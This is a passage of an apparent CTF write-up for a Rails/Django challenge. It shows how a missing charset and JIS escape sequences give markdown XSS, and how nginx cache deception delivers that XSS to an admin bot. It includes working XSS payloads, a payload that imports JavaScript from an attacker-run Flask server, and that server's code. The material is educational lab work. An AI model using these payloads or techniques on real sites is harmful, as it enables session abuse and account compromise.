+</span></span><span style="display:flex;"><span>      render <span style="color:#e6db74">:new</span>, <span style="color:#e6db74">status</span>: <span style="color:#e6db74">:unprocessable_entity</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">destroy</span>
+</span></span><span style="display:flex;"><span>    session<span style="color:#f92672">[</span><span style="color:#e6db74">:token</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">nil</span>
+</span></span><span style="display:flex;"><span>    redirect_to root_path, <span style="color:#e6db74">notice</span>: <span style="color:#e6db74">&#39;Logged out successfully&#39;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><p>No vulnerabilities have been discovered in account creation and connection, so we&rsquo;ll concentrate on the other routes.</p>
+<p>It is possible to create, view and report a contract to the administrator. If you&rsquo;re familiar with CTFs, you&rsquo;ll be able to see a path of exploitation:  we need to find an XSS vulnerability to steal the session of the person who&rsquo;s going to view our contract.<br>
+If you look at the file <strong>./web_encoDecept/interstellarAPI/contracts/util.py</strong>, you&rsquo;ll notice that the account that will be watching our contract is <em>contract_manager</em>. A malicious contract could therefore be used to recover this account!</p>
+<h2 id="first-vulnerability">First vulnerability</h2>
+<p>Unfortunately, the contract code is clean and doesn&rsquo;t allow us to inject HTML tags or javascript code directly into the page. This blocks our first compromise scenario, but let&rsquo;s not lose hope.</p>
+<p>On the <code>/settings</code> page, a feature intrigues us: it&rsquo;s possible to write and render a <em>bio</em> in <a href="https://fr.wikipedia.org/wiki/Markdown" target="_blank">markdown</a>.<br>
+For those unfamiliar with markdown, it&rsquo;s a textual language that allows text to be formatted via a rendering process.</p>
+<p>The code responsible for this rendering is in the file:</p>
+<ul>
+<li><strong>./contract_frontend/app/helpers/application_helper.rb</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e"># app/helpers/application_helper.rb</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">module</span> ApplicationHelper
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">render_markdown</span>(text)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">if</span> text<span style="color:#f92672">.</span>nil? <span style="color:#75715e"># Return an empty string if text is nil</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Configure Redcarpet to render Markdown with links and images enabled</span>
+</span></span><span style="display:flex;"><span>    renderer <span style="color:#f92672">=</span> <span style="color:#66d9ef">Redcarpet</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Render</span><span style="color:#f92672">::</span><span style="color:#66d9ef">HTML</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">filter_html</span>: <span style="color:#66d9ef">true</span>)
+</span></span><span style="display:flex;"><span>    markdown <span style="color:#f92672">=</span> <span style="color:#66d9ef">Redcarpet</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Markdown</span><span style="color:#f92672">.</span>new(renderer, {
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">no_intra_emphasis</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">autolink</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">tables</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">fenced_code_blocks</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">disable_indented_code_blocks</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">strikethrough</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">superscript</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Render Markdown to HTML</span>
+</span></span><span style="display:flex;"><span>    markdown<span style="color:#f92672">.</span>render(text)<span style="color:#f92672">.</span>html_safe
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><p>The library used is <a href="https://github.com/vmg/redcarpet" target="_blank">redcarpet</a> in its latest version <em>(cf: Gemfile)</em>.<br>
+Two behaviors are often abused to perform XSS on markdown renderers:</p>
+<ul>
+<li><code>&lt;a&gt;</code> tags</li>
+<li><code>&lt;img&gt;</code> tags</li>
+</ul>
+<p>Here are two examples of how to use these tags:</p>
+<ul>
+<li><code>[hello](there)</code> -&gt; <code>&lt;a href=&quot;there&quot;&gt;hello&lt;/a&gt;</code></li>
+<li><code>![hello](there)</code> -&gt; <code>&lt;img src=&quot;there&quot; alt=&quot;hello&quot;&gt;</code></li>
+</ul>
+<p>The first possible XSS is: <code>[hello](javascript:alert(1))</code><br>
+The generated code will be: <code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;hello&lt;/a&gt;</code> , the javascript code will be executed when you click on <code>hello</code>.<br>
+<img src="./img/image-2.png" alt="1click XSS"></p>
+<p>The second behavior can also be abused to form this kind of payload:</p>
+<ul>
+<li><code>![hello](&quot;/onerror=alert(1))//)</code> -&gt; <code>&lt;img src=&quot;&quot;/onerror=alert(1)//&quot; alt=&quot;hello&quot;&gt;</code></li>
+</ul>
+<p>Unfortunately for us, the library is programmed to prevent this kind of injection.</p>
+<p>One important thing is hidden in the <em>./contract_frontend/lib/remove_charset_middleware.rb</em> file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e"># lib/remove_charset_middleware.rb</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RemoveCharsetMiddleware</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">initialize</span>(app)
+</span></span><span style="display:flex;"><span>      @app <span style="color:#f92672">=</span> app
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">call</span>(env)
+</span></span><span style="display:flex;"><span>      status, headers, response <span style="color:#f92672">=</span> @app<span style="color:#f92672">.</span>call(env)
+</span></span><span style="display:flex;"><span>      headers<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> headers<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">].</span>sub(<span style="color:#e6db74">/; charset=.*$/</span>, <span style="color:#e6db74">&#39;&#39;</span>) <span style="color:#66d9ef">if</span> headers<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">[</span>status, headers, response<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><p>There is a <em>middleware</em> that removes the <code>charset</code> from all pages:
+<img src="./img/image-3.png" alt="Charset removed from headers"></p>
+<p>The absence of charset has often been used to carry out XSS attacks, with UTF-7 in the past for example.<br>
+A few months ago, <a href="https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/" target="_blank">SonarSource research</a> demonstrated that it was possible to exploit this misconfiguration to trick the browser.</p>
+<p>Indeed, in the absence of an explicitly described <em>charset</em>, browsers will try to guess the encoding used.<br>
+As described in <a href="https://github.com/stefan-schiller-sonarsource" target="_blank">Stefan Schiller</a>&rsquo;s article , certain characters such as <code>\x1b$@</code> can be used to switch the browser to the <code>JIS X 0208 1978</code> encoding.</p>
+<p>All swap characters are described here:
+<img src="./img/image-4.png" alt="Encoding swapper"></p>
+<p>This behavior currently only works on google chrome.<br>
+Here is a code that allowed us to test it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, Response
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;OPTIONS&#34;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">poc</span>():
+</span></span><span style="display:flex;"><span>    xss <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;img src=&#34;0.png&#34; alt=&#34;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">$@&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;p&gt;AM I READABLE ? NO&lt;/p&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        </span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">(B
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;p&gt;AM I READABLE ? YES&lt;/p&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#f92672">.</span>strip()ss
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span>  Response(xss)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Content-Type&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;text/html&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">3333</span>, debug<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span></code></pre></div><p><img src="./img/image-5.png" alt="Swapped encoding"></p>
+<p>As you can see, the <code>x1b</code> character has changed the encoding chosen by the page.
+By using the <code>x1bCB</code> character, it is possible to return to the <code>ascii</code> encoding:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.png&#34;</span> <span style="color:#a6e22e">alt</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\x1b$@&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">p</span>&gt;AM I READABLE ? NO&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>        \x1b(B
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">p</span>&gt;AM I READABLE ? YES&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p><img src="./img/image-6.png" alt="Double swapped encoding"></p>
+<p>This behavior can be abused to change the <code>&quot;</code> character. By placing <code>\x1b$@</code> and <code>\x1b(B</code> around a <code>&quot;</code>, it will be interpreted as <code>JIS X 0208 1978</code>.</p>
+<p>In the case of an XSS, this gives:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.png&#34;</span> <span style="color:#a6e22e">alt</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\x1b$@&#34;</span>&gt; \x1b(B &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.png&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p><img src="./img/image-7.png" alt="Malformed DOM"></p>
+<p>As the <code>“</code> is misinterpreted, the second <code>&lt;img&gt;</code> tag ends up <em>(up to the next <code>”</code>)</em> in the <code>alt</code> parameter of the first tag.</p>
+<p>This confusion allows arbitrary arguments to be injected into the second <code>&lt;img&gt;</code> tag!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.png&#34;</span> <span style="color:#a6e22e">alt</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\x1b$@&#34;</span>&gt; \x1b(B &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34; onerror=alert(1)//&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p><img src="./img/image-8.png" alt="XSS by abusing encoding swappping"></p>
+<p>Finally, this behavior can be translated into markdown in order to XSS our application:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span>![<span style="color:#f92672">\x1b$@</span>](<span style="color:#a6e22e">0.png</span>) \x1b(B ![<span style="color:#f92672">poc</span>](<span style="color:#a6e22e"> onerror=alert(1</span>)//)
+</span></span></code></pre></div><p>When encoded, it looks like this: <code>!%5B%1B$@%5D(0.png)%20%1B(B%20!%5Bpoc%5D(%20onerror=alert(1)//)</code>.</p>
+<p>With Burpsuite we send this <em>bio</em> and XSS works ! Charset Rocks ^^
+<img src="./img/image-9.png" alt="XSS"></p>
+<p>Finally, we used this final payload to run javascript code from home without having to edit the description each time:</p>
+<pre tabindex="0"><code>![\x1b$@](0.png) \x1b(B ![poc]( onerror=import(&#34;http://127.0.0.1:3333/js&#34;)//)
+</code></pre><p>With associated flask code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, Response
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/js&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;OPTIONS&#34;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">js</span>():
+</span></span><span style="display:flex;"><span>    xss <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">alert(2)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span>  Response(xss)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Content-Type&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;text/javascript&#39;</span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Access-Control-Allow-Origin&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;*&#39;</span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Access-Control-Allow-Headers&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;*&#39;</span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Access-Control-Allow-Methods&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;GET,POST,OPTIONS,DELETE,PUT&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">3333</span>, debug<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span></code></pre></div><p><em>(CORS must be wildcard (*) otherwise the page won&rsquo;t be able to import them.)</em></p>
+<p><img src="./img/image-10.png" alt="XSS with import()"></p>
+<p>A question arises, How do you send this XSS to the bot? It&rsquo;s only present on my page and is specific to my profile.</p>
+<h2 id="second-vulnerability">Second vulnerability</h2>
+<p>Something surprising is the use of a reverse proxy in a CTF. Why not use the Rails server directly on the front end?
+Also, why use a caching service??? This is rather surprising for a service that will be used by only a few players.</p>
+<p>In a more realistic context, caching is often a great way of increasing the exploitability of an XSS.<br>
+Here, we&rsquo;re going to attempt to cache our <code>/settings</code> page with the XSS so that the bot can access it.</p>
+<p>Cache operation is fairly straightforward:<br>
+When accessing a resource for the <strong>first time</strong>, the reverse proxy forwards the request to a server, calculates a key based on various parameters <em>(path, GET parameter, anchor, &hellip;)</em> and saves the result, associating it with this cachekey</p>
+<p>When a <strong>second</strong> person requests the same resource, the cache calculates a new key and compares it with those already saved. If it recognizes it, it returns the resource and avoids an unnecessary call to the server <em>(in this case, Rails)</em>.</p>
+<p>The cache is often used for constant resources such as <strong>static files</strong>: <em>css</em>, <em>svg</em>, <em>js</em> etc&hellip;</p>
+<p>Here&rsquo;s the cache configuration:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>location ~ <span style="color:#ae81ff">\.</span><span style="color:#f92672">(</span>css|js|jpg|jpeg|png|gif|ico|woff|woff2|ttf|svg|eot|html|json<span style="color:#f92672">)</span>$ <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    proxy_cache my_cache;
+</span></span><span style="display:flex;"><span>    proxy_cache_key <span style="color:#e6db74">&#34;</span>$uri$is_args$args<span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    proxy_cache_valid <span style="color:#ae81ff">200</span> 5m;
+</span></span><span style="display:flex;"><span>    proxy_cache_valid <span style="color:#ae81ff">404</span> 1m;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    proxy_pass http://127.0.0.1:3000;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    proxy_set_header Host $http_host; <span style="color:#75715e"># Pass original host and port</span>
+</span></span><span style="display:flex;"><span>    proxy_set_header X-Forwarded-Proto $scheme;
+</span></span><span style="display:flex;"><span>    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    proxy_http_version 1.1;
+</span></span><span style="display:flex;"><span>    add_header X-Cache-Status $upstream_cache_status;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Anything ending with one of the following extensions is saved by the cache:</p>
+<ul>
+<li><code>css, js, jpg, jpeg, png, gif, ico, woff, woff2, ttf, svg, eot, html, json</code></li>
+</ul>
+<p>This behavior can be confirmed with a a css file and the <code>X-Cache-Status</code> header.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>GET /assets/application-e0cf9d8fcb18bf7f909d8d91a5e78499f82ac29523d475bf3a9ab265d5e2b451.css HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: localhost:1337
+</span></span></code></pre></div><p>On first access, the response is cached. The header value is <code>MISS</code>.<br>
+<img src="./img/image-11.png" alt="cache miss"></p>
+<p>The second time: <code>HIT</code>.</p>
+<p><img src="./img/image-12.png" alt="cache hit"></p>
+<h4 id="tldr">TL;DR:</h4>
+<p>We&rsquo;re looking for a parsing differential between <code>nginx</code> and <code>rails</code> so that <strong>nginx</strong> thinks we&rsquo;re requesting a static file while <strong>rails</strong> sees the <em>/settings</em> path.</p>
+<h3 id="portswigger-to-the-rescue">PortSwigger to the rescue</h3>
+<p>In 2024, Martin Doyhenard, a researcher at portswigger, took a more general look at this topic, searching for parsing differences between WaFs (Web Application Firewalls), servers and proxy reverses.
+<a href="https://www.youtube.com/watch?v=70yyOMFylUA" target="_blank">His talk at DEFCON</a> was excellent, and <a href="https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Martin%20Doyhenard%20-%20Gotta%20Cache%20em%20all%20bending%20the%20rules%20of%20web%20cache%20exploitation.pdf" target="_blank">his slides</a> can be found here. Finally, there&rsquo;s also <a href="https://portswigger.net/research/gotta-cache-em-all" target="_blank">an article on the porswigger blog</a>.</p>
+<p>We&rsquo;ve spent a long time looking for separators that are only interpreted by one of the two servers. <em>(Like <code>;</code> on java)</em><br>
+Finally, Martin Doyhenard gives us the solution at 11.47min of his talk:</p>
+<p><img src="./img/image-13.png" alt="Path Normalisation"></p>
+<p>The <code>.</code> is a valid Rails delimiter!
+You can do a quick test with burpsuite:</p>
+<p><img src="./img/image-14.png" alt="alt text"></p>
+<ul>
+<li><code>/settings.vozec</code> is interpreted as <code>/settings</code>.</li>
+</ul>
+<p>So we can cache our /settings page with an extension that returns text rather than an image !
+Finally, we&rsquo;ve also added a <a href="https://absmartly.com/blog/what-is-cache-buster" target="_blank"><code>cachebuster</code></a> parameter, so that we can run several tests without ever caching the main <code>/settings</code> page.<br>
+This allows us to test several payloads with <em>/settings?test=1</em>, <em>/settings?test=2</em>, &hellip;</p>
+<p><img src="./img/image-15.png" alt="/settings cached"></p>
+<p><strong>The page can now be accessed with my malicious bio in an unauthenticated way!</strong></p>
+<p><img src="./img/image-16.png" alt="Cached XSS"></p>
+<h2 id="third-vulnerability">Third vulnerability</h2>
+<p>On closer inspection, the session is stored in an <a href="https://developer.mozilla.org/fr/docs/Web/HTTP/Cookies" target="_blank"><code>HttpOnly</code></a> <em>(_contract_frontend_session)</em> cookie, which prevents javascript code from retrieving it.</p>
+<p><img src="./img/image-17.png" alt="httponly"></p>
+<p>It is therefore impossible to take full control of the <code>contract_manager</code> account.<br>
+However, it is possible to perform javascript actions on the new functionalities obtained and return the result.<br>
+This scenario is possible because the actions are performed on the site where we have javascript execution. So there are no CORS or SOP problems, and the actions are performed in the name of the victim.</p>
+<p><em>To simplify the search, we&rsquo;ll change the <code>contract_manager</code> password to local to continue our search.</em></p>
+<p>A new feature allows you to search and filter all contracts.</p>
+<p><img src="./img/image-18.png" alt="new feature"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>GET /contracts/manage?title__contains<span style="color:#f92672">=</span>foo&amp;status<span style="color:#f92672">=</span>&amp;start_date<span style="color:#f92672">=</span>&amp;end_date<span style="color:#f92672">=</span> HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: localhost:1337
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">manage</span>
+</span></span><span style="display:flex;"><span>  filtered_params <span style="color:#f92672">=</span> filter_params
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  response <span style="color:#f92672">=</span> <span style="color:#66d9ef">if</span> filtered_params<span style="color:#f92672">.</span>empty?
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">.</span>auth(<span style="color:#e6db74">&#34;Token </span><span style="color:#e6db74">#{</span>session<span style="color:#f92672">[</span><span style="color:#e6db74">:token</span><span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;http://localhost:8080/api/contracts/filter/&#34;</span>, <span style="color:#e6db74">json</span>: { <span style="color:#e6db74">all</span>: <span style="color:#66d9ef">true</span> })
+</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">.</span>auth(<span style="color:#e6db74">&#34;Token </span><span style="color:#e6db74">#{</span>session<span style="color:#f92672">[</span><span style="color:#e6db74">:token</span><span style="color:#f92672">]</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;http://localhost:8080/api/contracts/filter/&#34;</span>, <span style="color:#e6db74">json</span>: filtered_params)
+</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status<span style="color:#f92672">.</span>success?
+</span></span><span style="display:flex;"><span>    @contracts <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>parse
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    @contracts <span style="color:#f92672">=</span> <span style="color:#f92672">[]</span>
+</span></span><span style="display:flex;"><span>    flash<span style="color:#f92672">[</span><span style="color:#e6db74">:alert</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Failed to load contracts. Please try again.&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><p>All our <code>GET</code> parameters are passed to the django api via the <code>/api/contracts/filter/</code> endpoint.<br>
+This is the only new feature on this account, so we&rsquo;re looking for a vulnerability on this route.<br>
+Here&rsquo;s the route code in the <strong>./interstellarAPI/contracts/views.py</strong> file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FilteredContractsView</span>(APIView):
+</span></span><span style="display:flex;"><span>    permission_classes <span style="color:#f92672">=</span> [IsAuthenticated, IsContractManagerOrAdmin]
+</span></span><span style="display:flex;"><span>
